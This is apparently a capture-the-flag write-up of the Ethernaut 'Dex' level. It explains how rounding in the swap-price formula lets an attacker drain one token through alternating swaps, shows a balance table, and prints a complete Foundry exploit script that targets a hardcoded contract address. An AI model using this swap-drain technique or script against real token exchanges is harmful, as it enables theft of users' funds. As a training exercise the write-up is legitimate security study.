# Decentralized Exchange (DEX) Smart Contract

## Introduction
This Solidity smart contract represents a decentralized exchange (DEX) where users can trade ERC20 tokens in a trustless manner. It includes functionalities for adding liquidity, swapping tokens, approving token transfers, and checking token balances.

## Contract Structure
The DEX contract (`Dex`) inherits from the `Ownable` contract, ensuring that only the owner (deployer) of the contract has certain privileges.

### State Variables
- `token1` and `token2`: Addresses of two ERC20 tokens to be traded on the DEX.

### Constructor
The constructor is empty, meaning initialization of state variables is expected to happen after deployment.

### Functions
1. `setTokens(address _token1, address _token2)`: Sets the addresses of the two tokens to be traded. Only the owner can call this function.

2. `addLiquidity(address token_address, uint amount)`: Allows the owner to add liquidity by transferring tokens to the DEX contract.

3. `swap(address from, address to, uint amount)`: Enables users to swap tokens. Requires the input tokens to be valid, and the caller to have sufficient balance. The swap price is determined by the ratio of token balances in the DEX contract.

4. `getSwapPrice(address from, address to, uint amount)`: Calculates the swap price based on the current token balances in the DEX contract.

5. `approve(address spender, uint amount)`: Allows users to approve the DEX contract to spend their tokens. It prevents the DEX contract itself from being approved.

6. `balanceOf(address token, address account)`: Retrieves the balance of a specific token for a given account.

## Swappable Token Contract
The `SwappableToken` contract represents an ERC20 token with additional functionality to prevent the DEX contract from being approved.

### State Variables
- `_dex`: Address of the DEX contract.

### Constructor
- Initializes the token with a given name, symbol, and initial supply.

### Functions
- `approve(address owner, address spender, uint256 amount)`: Overrides the standard `approve` function to prevent the DEX contract from being approved directly.

# Exploiting a Decentralized Exchange (DEX) Contract

## Introduction
In Solidity smart contracts, exploiting vulnerabilities can lead to substantial losses or gains. In the case of the provided DEX contract, a loophole exists that allows attackers to drain one of the two tokens from the contract by manipulating swap operations. Let's explore how this vulnerability can be exploited.

## Understanding the Vulnerability
The DEX contract's swap function lacks precision handling, as Solidity does not support floating-point numbers. This absence of precision control allows for rounding errors during token swaps, which can be leveraged to drain one of the tokens from the contract.

## Exploiting the Vulnerability
To exploit the vulnerability, an attacker must repeatedly swap tokens between token1 and token2 in a strategic manner to gradually drain one of the tokens from the contract. Here's a step-by-step breakdown of the exploitation process:
1. Approve a substantial amount of tokens for the DEX contract to spend.
2. Initiate a sequence of swap operations according to a predetermined pattern, ensuring that each swap gradually increases the balance of one token while decreasing the balance of the other.
3. Continue the swap sequence until the balance of one token in the contract reaches a critical threshold, such as zero.
4. Execute a final swap operation to drain the remaining balance of the target token from the contract.

## Implementing the Exploit
The provided script demonstrates how to execute the exploit on the DEX contract. Here's a summary of the script's functionality:
- Approve a generous allowance for both token1 and token2.
- Execute a series of swap operations according to the exploitation strategy, as outlined in the table below.
- Check the final balance of token1 in the DEX contract to confirm the success of the exploit.

| Swap Step | Token1 Balance (DEX) | Token2 Balance (DEX) | Token1 Balance (Attacker) | Token2 Balance (Attacker) |
|-----------|-----------------------|-----------------------|----------------------------|----------------------------|
| 1         | 110                   | 90                    | 0                          | 20                         |
| 2         | 86                    | 110                   | 24                         | 0                          |
| 3         | 110                   | 80                    | 0                          | 30                         |
| 4         | 69                    | 110                   | 41                         | 0                          |
| 5         | 110                   | 45                    | 0                          | 65                         |
| 6         | 0                     | 90                    | 110                        | 20                         |
    
    
    ```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;
    
    import "forge-std/Script.sol";
    import "../instances/Ilevel22.sol";
    
    contract POC is Script {
    
        Dex level22 = Dex(0x84c765cfdbA36b9e81Db0eb7C9356eed77296ed6);
        function run() external{
            vm.startBroadcast();
            level22.approve(address(level22), 500);
            address token1 = level22.token1();
            address token2 = level22.token2();
    
            level22.swap(token1, token2, 10);
            level22.swap(token2, token1, 20);
            level22.swap(token1, token2, 24);
            level22.swap(token2, token1, 30);
            level22.swap(token1, token2, 41);
            level22.swap(token2, token1, 45);
    
            console.log("Final token1 balance of Dex is : ", level22.balanceOf(token1, address(level22)));
            vm.stopBroadcast();
        }
    }
    

## Conclusion
Exploiting vulnerabilities in smart contracts requires a deep understanding of Solidity's intricacies and potential pitfalls. By identifying loopholes like precision loss in token swap operations, attackers can manipulate contracts to their advantage, potentially causing significant financial damage.

Developers must prioritize security in smart contract development by implementing robust testing, auditing, and best practices to mitigate the risk of exploitation. Additionally, users should exercise caution when interacting with decentralized applications to avoid falling victim to malicious actors exploiting vulnerabilities like the one discussed in this article.

